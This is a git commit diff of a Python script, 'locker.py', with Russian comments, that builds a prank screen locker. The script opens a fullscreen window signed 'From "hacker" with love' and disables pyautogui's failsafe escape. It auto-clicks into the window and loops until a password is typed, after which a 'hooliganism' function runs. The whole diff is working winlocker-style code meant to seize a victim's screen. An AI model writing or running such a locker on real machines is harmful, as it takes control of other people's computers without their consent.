d0916cd3878b4d5fa439599e2f78aed65c2fd85a
Yo're-In_David <51287631+Mad-Engineer-142@users.noreply.github.com>
2023-01-16 11:15:18 +0300

    Add files via upload

--- locker.py
+++ locker.py
@@ -22,33 +22,33 @@ def on_closing():
     # Добавляем сочетание клавиш, которые будут закрывать программу
     root.bind('<Control-KeyPress-c>', callback)
  
-# Создаем окно
-root = Tk()
-# Вырубаем защиту левого верхнего угла экрана
-pyautogui.FAILSAFE = False
-# Получаем ширину и высоту окна
-width = root.winfo_screenwidth()
-height = root.winfo_screenheight()
-# Задаем заголовок окна
-root.title('From "hacker" with love')
-# Открываем окно на весь экран
-root.attributes("-fullscreen", True)
-# Создаем поле для ввода, задаем его размеры и расположение
-entry = Entry(root, font=1)
-entry.place(width=150, height=50, x=width/2-75, y=height/2-25)
-# Создаем текстовые подписи и задаем их расположение
-label0 = Label(root, text="locker))) room", font=1)
-label0.grid(row=0, column=0)
-label1 = Label(root, text="Пиши пароль и жми Ctrl + C", font='Arial 20')
-label1.place(x=width/2-75-130, y=height/2-25-100)
-# Включаем постоянное обновление окна и делаем паузу
-root.update()
-sleep(0.2)
-# Кликаем в центр окна
-click(width/2, height/2)
-# обнуляем ключ
-k = False
-# Теперь непрерывно проверяем, не введен ли верный ключ
-# Если введен, вызываем функцию хулиганства
-while not k:
-    on_closing()
+def start():
+	root = Tk()
+	# Вырубаем защиту левого верхнего угла экрана
+	pyautogui.FAILSAFE = False
+	# Получаем ширину и высоту окна
+	width = root.winfo_screenwidth()
+	height = root.winfo_screenheight()
+	# Задаем заголовок окна
+	root.title('From "hacker" with love')
+	# Открываем окно на весь экран
+	root.attributes("-fullscreen", True)
+	# Создаем поле для ввода, задаем его размеры и расположение
+	entry = Entry(root, font=1)
+	entry.place(width=150, height=50, x=width/2-75, y=height/2-25)
+	# Создаем текстовые подписи и задаем их расположение
+	label0 = Label(root, text="locker))) room", font=1)
+	label0.grid(row=0, column=0)
+	label1 = Label(root, text="Пиши пароль и жми Ctrl + C", font='Arial 20')
+	label1.place(x=width/2-75-130, y=height/2-25-100)
+	# Включаем постоянное обновление окна и делаем паузу
+	root.update()
+	sleep(0.2)
+	# Кликаем в центр окна
+	click(width/2, height/2)
+	# обнуляем ключ
+	k = False
+	# Теперь непрерывно проверяем, не введен ли верный ключ
+	# Если введен, вызываем функцию хулиганства
+	while not k:
+	    on_closing()
